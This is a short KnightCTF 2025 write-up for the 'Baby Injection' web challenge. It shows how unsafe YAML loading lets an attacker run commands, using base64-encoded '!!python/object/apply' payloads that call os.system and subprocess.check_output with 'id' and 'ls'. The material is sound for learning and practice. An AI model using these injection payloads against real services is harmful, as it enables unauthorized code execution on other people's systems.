---
title: "Baby Injection - KnightCTF 2025"
category: "web"
type: "writeup"
tags: ["web", "base64", "subprocess", "baby", "injection", "knightctf", "knightctf-2025", "2025", "ctf-writeup"]
summary: "Des : Sometimes, seemingly harmless configuration files can do more than they appear."
source:
  name: "CTFtime writeup #39810"
  url: "https://ctftime.org/writeup/39810"
original_source: "https://github.com/rxx2me/CTFs-Writeups/blob/main/KnightCTF%202025/web/Baby%20Injection/README.md"
ctf:
  name: "KnightCTF 2025"
  year: 2025
  challenge: "Baby Injection"
---

## Metadata

- **CTF:** KnightCTF 2025
- **Task:** Baby Injection
- **Author team:** Nc{Cat}
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/39810>
- **Original writeup:** <https://github.com/rxx2me/CTFs-Writeups/blob/main/KnightCTF%202025/web/Baby%20Injection/README.md>

---
name : Baby Injection

Author : badhacker0x1

Des : Sometimes, seemingly harmless configuration files can do more than they appear. Can you uncover a hidden flaw and turn it to your advantage?

Solve :   
enter the url :   
http://172.105.121.246:5990/

First :   
see the endpoint base64 !! 

![image](<https://github.com/user-attachments/assets/976e5bf2-164a-4229-b64e-98eaaaa4c628>)

and decrypt it :   
![image](<https://github.com/user-attachments/assets/895376f6-43ea-4188-9207-92e9260fefc9>)

secoun :   
try yaml Injection

```  
yaml: !!python/object/apply:os.system ["id"]  
```  
to base64   
```  
eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbImlkIl0=  
```  
![image](<https://github.com/user-attachments/assets/9d9f13f1-d3e5-41fc-895e-3c19bfe33c39>)

Ok !! try to see srting 

```  
yaml: !!python/object/apply:subprocess.check_output [["id"]]  
```  
to base64 

```  
eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFtbImlkIl1d  
```

![image](<https://github.com/user-attachments/assets/bbbfe718-f18e-43d3-b707-7ca9485a4b29>)

Ok Done !!!

try :   
```  
yaml: !!python/object/apply:subprocess.check_output [["ls"]]  
```  
to Base64 :   
```  
eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFtbImxzIl1d  
```  
and the flag is : 

![image](<https://github.com/user-attachments/assets/88dfd5c1-48d0-4846-b151-a13b95f44a76>)
